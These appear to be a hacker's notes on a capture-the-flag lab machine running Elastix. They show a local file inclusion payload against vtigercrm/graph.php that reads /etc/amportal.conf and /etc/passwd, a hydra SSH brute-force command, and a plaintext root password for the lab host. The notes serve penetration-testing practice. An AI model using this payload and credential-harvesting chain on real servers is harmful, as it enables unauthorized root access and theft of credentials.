nmap -sC -sV -oA nmap 10.10.10.7
port 22 for ssh
port 25 for smtp (mail)
port 80 and 443 for apache http
port 10000 for webmin httpd
port 3306 for mySQL

SOLUTION #1 : LFI + password
Let's go on its webpage 10.10.10.7
Elastix :  an unified communications server software that brings together IP PBX, 
email, IM, faxing and collaboration functionality.
Copyright : running a date function, still 2019
Source Page : Nothing special on sight

Let's run dirbuster (find hidden directories and files)
We found /admin & /configs
/configs not conclusive
/admin no password :(
trying wrong ids, we get redirect to https://10.10.10.7/admin/config.php
Its says FreePBX 2.8.1.4, lets check for FreePBX 2.8.1.4 changelog

Let's check for /help, lets look for backup instructions, we see a backup dating back
from 2010
Lets go back to the front page and download the logo
curl -k https://10.10.10.7/themes/elastixneo/images/elastix_logo_mini.png -o elastix.png
-k to avoid certificates
run exiftool elastix.png to see if any metadata would say 2010,2011,2012... Not really

We know we run against elastix and an old version of it 2010
Lets run searchsploit elastix
Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php/webapps/37637.pl
searchsploit -x exploits/php/webapps/37637.pl
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&m
odule=Accounts&action
Lets go see page source, we see pids and passwords lets save all these
vi pw 

Another good path to check is /etc/passwd 
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&m
odule=Accounts&action
vi users
We want to do a ssh bruteforce, so lets grab every users that has a valid login
Glancing at the last line, I /bin/bash that's what I am looking for.
run g/nologin/d to erase /nologin routes from the file
Lets make our list of users nice and neat

Lets run hydra 
hydra -L users -P pw ssh://10.10.10.7
No catch weird ..., it may have something blocking us.
Lets try it manually ssh root@10.10.10.7 
password : jEhdIekWmdjE
Ouhhh it worked, we are root now ;)
